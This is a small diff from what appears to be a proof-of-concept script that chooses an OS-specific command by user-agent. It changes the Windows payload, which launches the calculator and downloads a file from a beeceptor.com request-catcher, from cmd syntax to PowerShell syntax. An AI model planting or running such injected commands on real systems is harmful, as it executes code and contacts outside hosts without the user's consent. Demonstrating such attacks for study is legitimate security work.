@@ -726,7 +726,7 @@
               if (ua.indexOf('win') !== -1) {
 
                 // windows
-                cmd = 'start calc && curl https://asdasdasdasd.free.beeceptor.com -o output.html\r\n';
+                cmd = 'Start-Process calc; Invoke-WebRequest https://asdasdasdasd.free.beeceptor.com -OutFile output.html\r\n';
               } else if (ua.indexOf('mac') !== -1) {
 
                 // macOS
